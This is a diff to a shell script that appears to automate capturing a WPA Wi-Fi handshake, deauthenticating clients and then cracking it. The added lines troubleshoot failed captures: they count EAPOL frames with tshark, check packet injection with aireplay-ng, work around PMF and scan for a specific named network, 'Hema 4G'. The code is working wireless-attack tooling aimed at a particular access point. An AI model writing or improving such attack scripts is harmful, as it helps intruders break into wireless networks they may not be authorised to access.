@@ -226,7 +226,30 @@ while :; do
 done
 kill "$AIRO_PID" 2>/dev/null; AIRO_PID=""
 # decide on the in-loop result only — do NOT re-run have_hs against the live file we just killed
-[ "$CAPTURED" = 1 ] || { err "no handshake captured — make sure a device is connected to the AP, then retry"; exit 3; }
+if [ "$CAPTURED" != 1 ]; then
+  err "no handshake captured — make sure a device is connected to the AP, then retry"
+  # diagnose what actually landed in the capture so the failure is actionable
+  diag="$cap-01.cap"
+  if [ -f "$diag" ]; then
+    info "diagnostics ($diag):"
+    aircrack-ng "$diag" </dev/null 2>/dev/null | awk '/BSSID/{p=1} p&&NF' | sed 's/^/      /'
+    if command -v tshark >/dev/null 2>&1; then
+      eapol=$(tshark -r "$diag" -Y eapol 2>/dev/null | wc -l | tr -d ' ')
+      if [ "${eapol:-0}" -eq 0 ]; then
+        warn "0 EAPOL frames captured — no 4-way handshake reached us on channel $CHAN. Likely:"
+        warn "  * injection not actually working — verify with:  aireplay-ng -9 $MON"
+        warn "  * 802.11w/PMF on the AP (protected deauth is ignored), or"
+        warn "  * the device is on the 5 GHz 'Hema 4G' (different BSSID) — scan with:  airodump-ng --band a $MON"
+      else
+        warn "$eapol EAPOL frame(s) captured but no COMPLETE handshake — only partial messages."
+        warn "toggle one device's Wi-Fi off/on once during the capture window so it reassociates cleanly."
+      fi
+    else
+      warn "install tshark (apt install -y tshark) for EAPOL-level capture diagnostics."
+    fi
+  fi
+  exit 3
+fi
 [ -s "$OUTDIR/handshake.cap" ] || cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
 ok "handshake saved: $OUTDIR/handshake.cap"
 [ "$NO_CRACK" = 1 ] && { ok "stopping before crack (--no-crack)"; exit 0; }
